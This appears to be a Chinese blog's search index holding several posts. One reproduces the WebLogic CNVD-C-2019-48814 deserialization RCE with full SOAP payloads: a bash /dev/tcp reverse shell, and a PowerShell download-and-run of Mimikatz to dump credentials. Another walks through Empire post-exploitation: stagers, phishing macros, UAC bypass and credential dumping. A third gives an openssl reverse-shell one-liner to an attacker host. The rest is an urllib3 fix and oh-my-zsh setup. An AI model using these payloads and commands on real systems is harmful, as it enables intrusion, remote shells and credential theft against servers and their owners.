<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>No module named ordered_dict</title>
      <link href="/2019/04/26/No-module-named-ordered-dict/"/>
      <url>/2019/04/26/No-module-named-ordered-dict/</url>
      
        <content type="html"><![CDATA[<hr><p>一、Problem</p><blockquote><p><code>ImportError: No module named ordered_dict</code></p></blockquote><p>二、Solution</p><pre><code>pip uninstall urllib3pip install urllib3==1.22</code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNVD-C-2019-48814 -- Weblogic</title>
      <link href="/2019/04/26/CNVD-C-2019-48814/"/>
      <url>/2019/04/26/CNVD-C-2019-48814/</url>
      
        <content type="html"><![CDATA[<hr><h3 id="一、复现漏洞"><a href="#一、复现漏洞" class="headerlink" title="一、复现漏洞"></a>一、复现漏洞</h3><blockquote><p><code>bea_wls9_async_response.war</code>组件反序列化远程命令执行漏洞复现记录</p></blockquote><h3 id="二、漏洞组件"><a href="#二、漏洞组件" class="headerlink" title="二、漏洞组件"></a>二、漏洞组件</h3><blockquote><p><code>bea_wls9_async_response.war</code></p></blockquote><h3 id="三、漏洞影响范围"><a href="#三、漏洞影响范围" class="headerlink" title="三、漏洞影响范围"></a>三、漏洞影响范围</h3><blockquote><p>WebLogic 10.X<br>WebLogic 12.1.3</p></blockquote><h3 id="四、漏洞路径"><a href="#四、漏洞路径" class="headerlink" title="四、漏洞路径"></a>四、漏洞路径</h3><blockquote><p><code>http://ip:port/_async/AsyncResponseService</code></p></blockquote><h3 id="五、漏洞确认"><a href="#五、漏洞确认" class="headerlink" title="五、漏洞确认"></a>五、漏洞确认</h3><blockquote><p>访问漏洞路径，返回如下页面，即有可能有漏洞</p></blockquote><p>  <img src="/2019/04/26/CNVD-C-2019-48814/9d7eb5a6.png" alt="9d7eb5a6.png"></p><h3 id="六、漏洞复现"><a href="#六、漏洞复现" class="headerlink" title="六、漏洞复现"></a>六、漏洞复现</h3><h4 id="Linux-poc"><a href="#Linux-poc" class="headerlink" title="Linux poc"></a>Linux poc</h4><p>  <strong>Request:</strong></p><pre><code>  POST /_async/AsyncResponseService HTTP/1.1  Host: 172.26.1.110:7001  Content-Length: 788  Accept-Encoding: gzip, deflate  SOAPAction:   Accept: */*  User-Agent: Apache-HttpClient/4.1.1 (java 1.5)  Cookie: ADMINCONSOLESESSION=mLTYcBpTqFSRlgC88t0vDYM09vgFq1vrf3KCpBfnLcx93GynxB7q!1778557847  Connection: keep-alive  content-type: text/xml  &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;     &lt;soapenv:Header&gt;   &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;  &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;  &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;  &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;  &lt;void index=&quot;0&quot;&gt;  &lt;string&gt;/bin/bash&lt;/string&gt;  &lt;/void&gt;  &lt;void index=&quot;1&quot;&gt;  &lt;string&gt;-c&lt;/string&gt;  &lt;/void&gt;  &lt;void index=&quot;2&quot;&gt;  &lt;string&gt;bash -i &amp;gt;&amp;amp; /dev/tcp/172.26.1.102/9999 0&amp;gt;&amp;amp;1&lt;/string&gt;  &lt;/void&gt;  &lt;/array&gt;  &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;  &lt;/work:WorkContext&gt;  &lt;/soapenv:Header&gt;  &lt;soapenv:Body&gt;  &lt;asy:onAsyncDelivery/&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p>  <strong>Response:</strong></p><pre><code>  HTTP/1.1 202 Accepted  Date: Thu, 25 Apr 2019 07:50:13 GMT  Content-Length: 0  X-Powered-By: Servlet/2.5 JSP/2.1</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/10a792b3.png" alt="10a792b3.png"></p><hr><h4 id="windows-poc"><a href="#windows-poc" class="headerlink" title="windows poc"></a>windows poc</h4><p>  <strong>Request:</strong></p><pre><code>  POST /_async/AsyncResponseService HTTP/1.1  Host: 172.26.1.126:7001  Content-Length: 852  Accept-Encoding: gzip, deflate  SOAPAction:   Accept: */*  User-Agent: Apache-HttpClient/4.1.1 (java 1.5)  Cookie: ADMINCONSOLESESSION=B1NRy3AIIVp5cleSu0pOOBkwzTUTLY4M6YcpBeKfVSkjfZoecu-8!1172056587  Connection: keep-alive  content-type: text/xml  &lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:wsa=&quot;http://www.w3.org/2005/08/addressing&quot; xmlns:asy=&quot;http://www.bea.com/async/AsyncResponseService&quot;&gt;     &lt;soapenv:Header&gt;   &lt;wsa:Action&gt;xx&lt;/wsa:Action&gt;  &lt;wsa:RelatesTo&gt;xx&lt;/wsa:RelatesTo&gt;  &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;  &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;  &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;  &lt;void index=&quot;0&quot;&gt;  &lt;string&gt;cmd&lt;/string&gt;  &lt;/void&gt;  &lt;void index=&quot;1&quot;&gt;  &lt;string&gt;/c&lt;/string&gt;  &lt;/void&gt;  &lt;void index=&quot;2&quot;&gt;  &lt;string&gt;powershell &quot;IEX (New-Object Net.WebClient).DownloadString(&#39;http://http://172.26.1.102/shell.ps1&#39;); Invoke-Mimikatz -DumpCreds&quot;&lt;/string&gt;  &lt;/void&gt;  &lt;/array&gt;  &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;  &lt;/work:WorkContext&gt;  &lt;/soapenv:Header&gt;  &lt;soapenv:Body&gt;  &lt;asy:onAsyncDelivery/&gt;  &lt;/soapenv:Body&gt;&lt;/soapenv:Envelope&gt;</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/84955dab.png" alt="84955dab.png"></p><p>  <img src="/2019/04/26/CNVD-C-2019-48814/16364e84.png" alt="16364e84.png"></p><h3 id="七、EXP"><a href="#七、EXP" class="headerlink" title="七、EXP"></a>七、EXP</h3><ol><li><a href="https://github.com/jas502n/CNVD-C-2019-48814" target="_blank" rel="noopener">GitHub - jas502n/CNVD-C-2019-48814: WebLogic wls9-async反序列化远程命令执行漏洞</a></li></ol><h4 id="1-1-async-reverse-shell-py"><a href="#1-1-async-reverse-shell-py" class="headerlink" title="1.1 async_reverse_shell.py"></a>1.1 <code>async_reverse_shell.py</code></h4><pre><code>  python async_reserve_shell.py http://172.26.1.110:7001/_async/AsyncResponseService 172.26.1.102 9999</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/e605551b.png" alt="e605551b.png"></p><pre><code>  nc -lvvp 9999</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/bdfbd2d5.png" alt="bdfbd2d5.png"></p><h4 id="1-2-async-webshell-py"><a href="#1-2-async-webshell-py" class="headerlink" title="1.2 async_webshell.py"></a>1.2 <code>async_webshell.py</code></h4><pre><code>  python async_webshell.py http://172.26.1.110:7001 shell.jsp</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/277076a5.png" alt="277076a5.png"></p><pre><code>  Webshell:   http://172.26.1.110:7001/bea_wls_internal/shell.jsp?cmd=whoami</code></pre><pre><code>  curl http://172.26.1.110:7001/bea_wls_internal/shell.jsp?cmd=whoami  curl http://172.26.1.110:7001/bea_wls_internal/shell.jsp?cmd=pwd</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/bb9ce055.png" alt="bb9ce055.png"></p><h4 id="1-3-async-command-favicon-py"><a href="#1-3-async-command-favicon-py" class="headerlink" title="1.3 async_command_favicon.py"></a>1.3 <code>async_command_favicon.py</code></h4><pre><code>  python async_command_favicon.py http://172.26.1.110:7001 whoami  curl -i http://172.26.1.110:7001/_async/favicon.ico</code></pre><p>  <img src="/2019/04/26/CNVD-C-2019-48814/eb8e7619.png" alt="eb8e7619.png"></p><ol start="2"><li><p><a href="https://github.com/fuhei/CNVD-C-2019-48814" target="_blank" rel="noopener">GitHub - fuhei/CNVD-C-2019-48814: CNVD-C-2019-48814 Weblogic wls9_async_response 反序列化利用工具</a></p><pre><code>python CNVD-C-2019-48814.py -l 172.26.1.102 -p 9999 -r http://172.26.1.110:7001/ -c</code></pre><p><img src="/2019/04/26/CNVD-C-2019-48814/40de0b90.png" alt="40de0b90.png"></p><pre><code>python CNVD-C-2019-48814.py -l 172.26.1.102 -p 9999 -r http://172.26.1.110:7001       //for unixpython CNVD-C-2019-48814.py -l 172.26.1.102 -p 9999 -r http://172.26.1.110:7001 -w    //for windows</code></pre><p><img src="/2019/04/26/CNVD-C-2019-48814/799b5394.png" alt="799b5394.png"></p><p><img src="/2019/04/26/CNVD-C-2019-48814/3e31b8b8.png" alt="3e31b8b8.png"></p></li></ol><h3 id="八、漏洞处置"><a href="#八、漏洞处置" class="headerlink" title="八、漏洞处置"></a>八、漏洞处置</h3><blockquote><p>Oracle官方暂未发布补丁，临时解决方案如下：</p><ol><li>删除该war包并重启webLogic;<br>注意：wls9_async_response.war属于一级应用包，对其进行移除或更名操作可能造成未知的后果，Oracle官方不建议对其进行此类操作。</li><li>通过访问策略控制禁止<code>/_async/*</code>路径的URL访问。建议使用WebLogic Server构建网站的信息系统运营者进行自查，发现存在漏洞后，按照临时解决方案及时进行修复。</li></ol></blockquote><h3 id="九、Refer"><a href="#九、Refer" class="headerlink" title="九、Refer"></a>九、Refer</h3><blockquote><p><a href="http://www.cnvd.org.cn/webinfo/show/4989" target="_blank" rel="noopener">国家信息安全漏洞共享平台</a><br><a href="https://github.com/fuhei/CNVD-C-2019-48814" target="_blank" rel="noopener">GitHub - fuhei/CNVD-C-2019-48814</a><br><a href="https://github.com/jas502n/CNVD-C-2019-48814" target="_blank" rel="noopener">GitHub - jas502n/CNVD-C-2019-48814</a><br><a href="https://github.com/vulhub/vulhub/tree/master/weblogic" target="_blank" rel="noopener">vulhub/weblogic at master · vulhub/vulhub · GitHub</a><br><a href="https://github.com/SkyBlueEternal/CNVD-C-2019-48814-or-CNNVD-201904-961" target="_blank" rel="noopener">GitHub - SkyBlueEternal/CNVD-C-2019-48814-or-CNNVD-201904-961</a><br><a href="https://blog.csdn.net/cz596738622/article/details/80483812" target="_blank" rel="noopener">linux安装weblogic10.3.6 - cz596738622的专栏 - CSDN博客</a><br><a href="https://www.oracle.com/technetwork/cn/middleware/weblogic/downloads/wls-main-091116-zhs.html" target="_blank" rel="noopener">WebLogic Server 12c (12.2.1)、WebLogic Server 11g (10.3.6) 和早期版本</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>empire后渗透工具详解</title>
      <link href="/2019/04/12/empire/"/>
      <url>/2019/04/12/empire/</url>
      
        <content type="html"><![CDATA[<hr><p><strong>一、empire简介</strong></p><blockquote><p>Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建立在密码学、安全通信和灵活的架构之上。Empire实现了无需powershell.exe就可运行PowerShell代理的功能。快速部署后期漏洞利用模块，从键盘记录器到Mimikatz，并且能够适应通信躲避网络检测，所有的这些功能都封装在一个以实用性为重点的框架中。<br>关于内网渗透，我们平时基本第一时间想到Metasploit，集信息收集，预渗透，渗透，后渗透，木马，社会工程学于一体的平台，但是Empire就是针对内网的渗透，针对powershell，在内网渗透能用到的powershell脚本，全部集成在Empire框架中，其更是域渗透神器。</p></blockquote><hr><p><strong>二、empire的安装</strong></p><pre><code>git clone https://github.com/EmpireProject/Empire.gitcd Empire/cd setup/sudo ./install.shcd Empire/cd setup/./reset.sh</code></pre><hr><p><strong>三、empire简单命令</strong></p><pre><code>cd Empire/./empire</code></pre><pre><code>(Empire) &gt; helpCommands=================agents          跳转到 &quot;代理&quot; 菜单。creds           显示数据库中的凭据。exit            退出帝国help            显示帮助菜单。interact        与特定代理交互。list            列出活动代理或侦听器。listeners       侦听器与活跃的侦听器交互。load            从非标准文件夹加载empire模块。plugin          加载一个插件文件来扩展empire。plugins         所有可用和活动的插件。preobfuscate    预融合 PowerShell 模块源文件reload          重新加载一个 (或全部) empire模块。report          生成CSV和日志文件报告: session.csv, credentis.csv, master.logreset           重置全局选项 (例如 IP 白名单)。resource        从文件中读取并执行empire命令的列表。searchmodule    模块搜索empire模块名称描述。set             设置全局选项 (例如 IP 白名单)。show            显示全局选项 (例如 IP 白名单)。usemodule       使用empire模块。usestager       使用者使用empire的毒刺。</code></pre><pre><code>(Empire) &gt; help(Empire) &gt; listeners(Empire: listeners) &gt; info(Empire: listeners) &gt; set Name test(Empire: listeners) &gt; execute(Empire: listeners) &gt; usestager launcher test(Empire: agents) &gt; interact USSZC2P1XCTBKYGH(Empire: USSZC2P1XCTBKYGH) &gt; shell dir(Empire: USSZC2P1XCTBKYGH) &gt; shell ipconfig</code></pre><p><img src="/2019/04/12/empire/help.png" alt="help.png"></p><hr><p><strong>四、生成反弹shell代理</strong></p><ol><li>powershell反弹shell代理</li></ol><pre><code>(Empire) &gt; listeners(Empire: listeners) &gt; uselistener(Empire: listeners) &gt; uselistener http(Empire: listeners/http) &gt; info(Empire: listeners/http) &gt; set Name WIN7(Empire: listeners/http) &gt; set Host http://192.168.1.25:8889(Empire: listeners/http) &gt; set Port 8889(Empire: listeners/http) &gt; execute(Empire: listeners/http) &gt; listeners(Empire: listeners) &gt; launcher powershell WIN7执行生成的powershell脚本，empire端显示监听成功</code></pre><p><img src="/2019/04/12/empire/1.png" alt="listeners"></p><ol start="2"><li>python反弹shell代理</li></ol><pre><code>(Empire: listeners) &gt; launcher python WIN7执行生成的python脚本，empire端显示监听成功</code></pre><ol start="3"><li>vbs反弹shell代理</li></ol><pre><code>(Empire: listeners) &gt; usestager windows/launcher_vbs WIN7(Empire: stager/windows/launcher_vbs) &gt; info(Empire: stager/windows/launcher_vbs) &gt; execute执行在tmp目录下生成的launcher.vbs，empire端显示监听成功</code></pre><ol start="4"><li>钓鱼宏代理</li></ol><pre><code>(Empire: listeners) &gt; usestager windows/macro WIN7(Empire: stager/windows/macro) &gt; info(Empire: stager/windows/macro) &gt; execute将在tmp目录下生成的macro文件中的代码，复制到创建execl的宏代码中。</code></pre><hr><p><strong>五、empire攻击win7过程</strong></p><ol><li>进入listeners</li></ol><p><img src="/2019/04/12/empire/1.png" alt="listeners"></p><ol start="2"><li>使用并配置http listeners</li></ol><p><img src="/2019/04/12/empire/2.png" alt="listeners"></p><ol start="3"><li>使用攻击木马</li></ol><p><img src="/2019/04/12/empire/3.png" alt="listeners"></p><ol start="4"><li>使用并生成vbs类型的攻击木马</li></ol><p><img src="/2019/04/12/empire/4.png" alt="listeners"></p><p><img src="/2019/04/12/empire/5.png" alt="listeners"></p><ol start="5"><li>在tmp目录下生成launcher.vbs木马</li></ol><p><img src="/2019/04/12/empire/6.png" alt="listeners"></p><ol start="6"><li>执行木马后，empire端成功返回监听代理</li></ol><p><img src="/2019/04/12/empire/7.png" alt="listeners"></p><ol start="7"><li>修改代理名字</li></ol><p><img src="/2019/04/12/empire/8.png" alt="listeners"></p><ol start="8"><li>进入代理并使用bypassuac提权，提权成功生成一个在Username处前有<code>*</code>号的新的代理。</li></ol><p><img src="/2019/04/12/empire/9.png" alt="listeners"></p><ol start="9"><li>修改提权之后的代理名称，进入代理，使用mimikatz抓取机器密码，creds查看明文和密文密码</li></ol><p><img src="/2019/04/12/empire/10.png" alt="listeners"></p><p><img src="/2019/04/12/empire/11.png" alt="listeners"></p><p><img src="/2019/04/12/empire/12.png" alt="listeners"></p><p><img src="/2019/04/12/empire/13.png" alt="listeners"></p><ol start="10"><li>sysinfo查看系统信息</li></ol><p><img src="/2019/04/12/empire/14.png" alt="listeners"></p><ol start="11"><li>upload上传文件、download下载文件、dir查看目录</li></ol><p><img src="/2019/04/12/empire/15.png" alt="listeners"></p><p><img src="/2019/04/12/empire/16.png" alt="listeners"></p><hr><p><strong>六、命令详解</strong></p><ol><li>listeners</li></ol><pre><code>(Empire) &gt; listeners(Empire: listeners) &gt; helpListener Commands=================agents          跳转到代理菜单。back            返回到主菜单。creds           从数据库返回凭据。delete          从数据库中删除删除侦听器disable         禁用 (停止) 一个或所有侦听器。听者不会自动从帝国开始edit            编辑更改侦听器选项, 在重新启动侦听器之前不会生效enable          启用并启动一个或所有列表。exit            退出empire。help            显示帮助菜单。info            显示给定活动侦听器的信息。kill            杀死一个或所有活跃的侦听器。launcher        为侦听器生成初始启动器。list            列出所有活动侦听器 (或代理)。listeners       跳转到侦听器菜单。main            返回主菜单。resource        从文件中读取并执行帝国命令的列表。uselistener     使用empire听众模块。usestager       使用empire的stager木马。</code></pre><p><img src="/2019/04/12/empire/listeners.png" alt="listeners"></p><ol start="2"><li>usestarger </li></ol><pre><code>(Empire) &gt;usestager stager/windows/launcher_vbs win71pre(Empire: stager/windows/launcher_vbs) &gt; helpagents         跳转到代理菜单。back          返回返回菜单。creds          从数据库返回凭据。execute      执行生成器执行给定的empire支架。exit          退出empire。generate      执行给定的empire支架。help          显示帮助菜单。info          显示统计器选项。interact      与特定代理交互。list          列出所有活动代理 (或侦听器)。listeners      跳转到侦听器菜单。main          返回主菜单。options      选项显示统计器选项。resource      从文件中读取并执行empire命令的列表。set          设置一个稳定器选项。unset          取消设置的统计器选项。</code></pre><ol start="3"><li>interact</li></ol><pre><code>(Empire) &gt; interact win71pre(Empire: win71pre) &gt; helpAgent Commands==============agents            跳转到代理菜单。back             返回菜单。bypassuac         运行bypassuac, 绕过uac，为侦听器生成一个新的高完整性代理。例如: 生成&lt;listener&gt;clear             清除代理任务。creds             从数据库返回凭据。download         任务代理下载文件。exit             退出任务代理退出。help             显示特定命令的帮助菜单或语法。info             显示有关此代理的信息injectshellcode     将侦听器shellcode注入远程进程。例如: 注射代码&lt;meter_listener&gt; &lt;pid&gt;jobs             返回作业或终止正在运行的作业。kill             终止任务代理以终止特定的进程名称或 ID。killdate        获取或设置代理的杀人日期 (01.5。list             列出所有活动代理 (或侦听器)。listeners         跳转到侦听器菜单。lostlimit        代理更改丢失的代理检测的限制main            返回主菜单。mimikatz         在客户端上运行调用调用。psinject         将启动器注入远程进程。例如, 项目&lt;listener&gt; &lt;pid rocess_name=&quot;&quot;&gt;pth             通过Mimikatz执行CredID的PTH。rename             重命名重命名代理。resource         从文件中读取并执行empire命令的列表。revtoself         使用凭据令牌来恢复令牌特权。sc             采用屏幕截图, 默认值为 PNG。给出比率意味着使用 JPEG。例如, sc [1-100]scriptcmd         在当前导入的 PowerShell 脚本中执行一个函数。scriptimport          脚本端口导入 PowerShell 脚本并将其保存在代理的内存中。searchmodule           搜索模块搜索empire模块名称描述。shell             要使用 shell 命令的代理。shinject         将注入非 meterpreter 侦听器shellcode插入远程进程。例如: shinject &lt;listener&gt; &lt;pid&gt;sleep             休眠任务代理到 &quot;睡眠间隔 [抖动]&quot;spawn             生成一个新的empire代理为给定的听众名称。例如: 生成&lt;listener&gt;steal_token           使用凭据令牌模拟给定进程 ID 的令牌。sysinfo         任务代理以获取系统信息。updatecomms           动态更新代理通信到另一个侦听器updateprofile         更新代理连接配置文件。upload            上载文件。usemodule         使用empire powershell模块。workinghours           获取或设置代理的工作时间 (9:00-17:00).</code></pre><p><img src="/2019/04/12/empire/interact.png" alt="interact"></p><ol start="4"><li>agents</li></ol><p><img src="/2019/04/12/empire/agents.png" alt="agents"></p><ol start="5"><li>creds</li></ol><p><img src="/2019/04/12/empire/creds.png" alt="creds"></p><ol start="6"><li>list</li></ol><p><img src="/2019/04/12/empire/list.png" alt="list"></p><ol start="7"><li>launcher</li></ol><p><img src="/2019/04/12/empire/launcher.png" alt="launcher"></p><ol start="8"><li>load</li></ol><p><img src="/2019/04/12/empire/load.png" alt="load"></p><ol start="9"><li>plugin</li></ol><p><img src="/2019/04/12/empire/plugin.png" alt="plugin"></p><ol start="10"><li>plugins</li></ol><p><img src="/2019/04/12/empire/plugins.png" alt="plugins"></p><ol start="11"><li>reload</li></ol><p><img src="/2019/04/12/empire/reload.png" alt="reload"></p><ol start="12"><li>report</li></ol><p><img src="/2019/04/12/empire/report.png" alt="report"></p><ol start="13"><li>reset</li></ol><p><img src="/2019/04/12/empire/reset.png" alt="reset"></p><ol start="14"><li>searchmodule</li></ol><p><img src="/2019/04/12/empire/searchmodule.png" alt="searchmodule"></p><ol start="15"><li>set</li></ol><p><img src="/2019/04/12/empire/set.png" alt="set"></p><ol start="16"><li>show</li></ol><p><img src="/2019/04/12/empire/show.png" alt="show"></p><ol start="17"><li>usemodule</li></ol><p><img src="/2019/04/12/empire/usemodule.png" alt="usemodule"></p><ol start="18"><li>usestager</li></ol><p><img src="/2019/04/12/empire/usestager.png" alt="usestager"></p><hr><p><strong>七、Refer</strong></p><blockquote><p><a href="http://www.powershellempire.com/" target="_blank" rel="noopener">PowerShell Empire | Building an Empire with PowerShell</a><br><a href="http://www.powershellempire.com/?page_id=110" target="_blank" rel="noopener">Quick Start | PowerShell Empire</a><br><a href="https://github.com/EmpireProject/Empire" target="_blank" rel="noopener">GitHub - EmpireProject/Empire: Empire is a PowerShell and Python post-exploitation agent.</a><br><a href="https://xz.aliyun.com/t/67" target="_blank" rel="noopener">后渗透测试神器Empire的详解 - 先知社区</a></p></blockquote>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>openssl-shell</title>
      <link href="/2019/04/09/openssl-shell/"/>
      <url>/2019/04/09/openssl-shell/</url>
      
        <content type="html"><![CDATA[<p>利用openssl反弹shell</p><hr><blockquote><p><strong>1. 在远程攻击主机上生成秘钥文件</strong></p></blockquote><pre><code>openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-1.png" alt="openssl-1.png"></p><hr><blockquote><p><strong>2. 在远程攻击主机上启动监视器</strong></p></blockquote><pre><code>openssl s_server -quiet -key key.pem -cert cert.pem -port &lt;PORT&gt;</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-2.png" alt="openssl-2.png"></p><hr><blockquote><p><strong>3. 在目标机上反弹shell</strong></p></blockquote><pre><code>mkfifo /tmp/s; /bin/sh -i &lt; /tmp/s 2&gt;&amp;1 | openssl s_client -quiet -connect &lt;ATTACKER-IP&gt;:&lt;PORT&gt; &gt; /tmp/s; rm /tmp/s</code></pre><p><img src="/2019/04/09/openssl-shell/openssl-3.png" alt="openssl-3.png"></p><hr><blockquote><p><strong>4. refer</strong></p></blockquote><p><a href="https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998" target="_blank" rel="noopener">https://medium.com/@int0x33/day-43-reverse-shell-with-openssl-1ee2574aa998</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> skills </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>oh-my-zsh</title>
      <link href="/2019/04/08/oh-my-zsh/"/>
      <url>/2019/04/08/oh-my-zsh/</url>
      
        <content type="html"><![CDATA[<p>Install Oh-my-zsh In Linux</p><hr><blockquote><p><strong>1. Install</strong></p></blockquote><pre><code class="shell">apt install -y gitapt install -y zshsh -c &quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;sh -c &quot;$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)&quot;</code></pre><hr><blockquote><p><strong>2. My Theme</strong></p></blockquote><ul><li>1.</li></ul><pre><code class="shell">cd .oh-my-zsh/custom/themes/vim robbyrussell-ascii.zsh-theme</code></pre><ul><li>2.</li></ul><pre><code class="shell">local ret_status=&quot;%(?:%{$fg[green]%}&gt;:%{$fg[red]%}&gt;%s)&quot;PROMPT=&#39;${ret_status} %{$fg[cyan]%}%~%{$reset_color%} $(git_prompt_info)%{$fg[green]%}-&gt; &#39;ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%{$fg[blue]%}git:(%{$fg[red]%}&quot;ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%{$reset_color%} &quot;ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%{$fg[blue]%}) %{$fg[yellow]%}x%{$reset_color%}&quot;</code></pre><ul><li>3.</li></ul><pre><code class="shell">local ret_status=&quot;%(?:%{$fg_bold[green]%}➜:%{$fg_bold[red]%}➜ )&quot;PROMPT=&#39;${ret_status} %{$fg[cyan]%}%~%{$reset_color%} $(git_prompt_info)%{$fg_bold[green]%}➜  &#39;ZSH_THEME_GIT_PROMPT_PREFIX=&quot;%{$fg[blue]%}git:(%{$fg[red]%}&quot;ZSH_THEME_GIT_PROMPT_SUFFIX=&quot;%{$reset_color%} &quot;ZSH_THEME_GIT_PROMPT_DIRTY=&quot;%{$fg[blue]%})%{$fg[yellow]%}&quot;ZSH_THEME_GIT_PROMPT_CLEAN=&quot;%{$fg[blue]%})&quot;</code></pre><ul><li><ol start="4"><li></li></ol></li></ul><pre><code class="shell">vim .zshrcZSH_THEME=&quot;zsh_shell-ascii&quot;source .zshrc</code></pre><hr><blockquote><p><strong>3. 效果如图</strong></p></blockquote><p><img src="/2019/04/08/oh-my-zsh/oh-my-zsh.png" alt="oh-my-zsh.png"><br><img src="/2019/04/08/oh-my-zsh/oh-my-zsh-2.png" alt="oh-my-zsh-2.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
